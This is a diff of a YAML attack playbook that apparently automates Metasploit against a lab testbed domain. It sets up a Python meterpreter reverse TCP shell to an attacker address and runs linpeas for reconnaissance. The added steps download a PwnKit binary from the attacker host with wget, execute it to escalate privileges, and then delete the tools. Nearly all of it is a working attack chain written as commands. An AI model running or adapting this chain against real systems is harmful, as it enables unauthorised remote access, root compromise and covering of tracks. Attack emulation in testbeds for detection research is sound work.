@@ -1,11 +1,11 @@
 ###
 msf_config:
-  password: hackhelfer
+  password: hackerman
   server: localhost
 
 vars:
   $SERVER_ADDRESS: 192.42.0.254
-  $ATTACKER_ADDRESS: 192.42.1.58
+  $ATTACKER_ADDRESS: 192.42.2.117
   $DNS_SERVER: 192.42.0.233
   $DOMAIN: aecid-testbed.com
   $USER: aecid
@@ -33,7 +33,7 @@ commands:
     options:
       RHOSTS: 192.42.0.254
     payload_options:
-      LHOST: 192.42.1.58
+      LHOST: 192.42.2.117
     payload: cmd/unix/python/meterpreter/reverse_tcp
 
 
@@ -44,7 +44,7 @@ commands:
 
   - type: msf-session
     session: "foothold"
-    cmd: upload /home/$USER/linpeas.sh
+    cmd: upload /var/www/html/linpeas.sh
 
   - type: msf-session
     cmd: shell
@@ -54,17 +54,21 @@ commands:
   - type: msf-session
     cmd: python3 -c "import pty;pty.spawn(\"/bin/bash\")";
     session: "foothold"
-
+ 
   - type: msf-session
     cmd: export SHELL=bash
     session: "foothold"
-
+ 
   - type: msf-session
     cmd: export TERM=xterm256-color
     session: "foothold"
-
+ 
   - type: msf-session
     cmd: stty rows 38 columns 116
+    session: "foothold"
+
+  - type: msf-session
+    cmd: 'export PS1="PWN >"'
     session: "foothold"
 
   - type: msf-session
@@ -72,12 +76,42 @@ commands:
     session: "foothold"
 
   - type: msf-session
-    cmd: ./linpeas.sh
+    cmd: ./linpeas.sh -s -q -N 2> /dev/null
+    write: True
     session: "foothold"
+    end_str: "PWN >"
+
+  - type: sleep
+    seconds: 180
+
+#  - type: msf-session
+#    cmd: "read id"
+#    read: True
+#    session: "foothold"
+
+  - type: msf-session
+    cmd: wget http://$ATTACKER_ADDRESS/PwnKit > /dev/null 2>&1
+    session: "foothold"
+    end_str: "PWN >"
+
+  - type: msf-session
+    cmd: chmod +x PwnKit && ./PwnKit
+    session: "foothold"
+
+  - type: msf-session
+    cmd: id
+    session: "foothold"
+    end_str: "PWN >"
+
+  - type: msf-session
+    cmd: rm ./PwnKit
+    session: "foothold"
+    end_str: "PWN >"
 
   - type: msf-session
     cmd: rm linpeas.sh
     session: "foothold"
+    end_str: "PWN >"
 
       #
       #  - type: msf-session
@@ -97,11 +131,3 @@ commands:
       #  - type: msf-session
       #    cmd: ls -l /root
       #
-  - type: msf-session
-    cmd: exit
-    session: "foothold"
-
-  - type: msf-module
-    cmd: auxiliary/scanner/portscan/tcp
-    options:
-      RHOSTS: 192.42.0.254
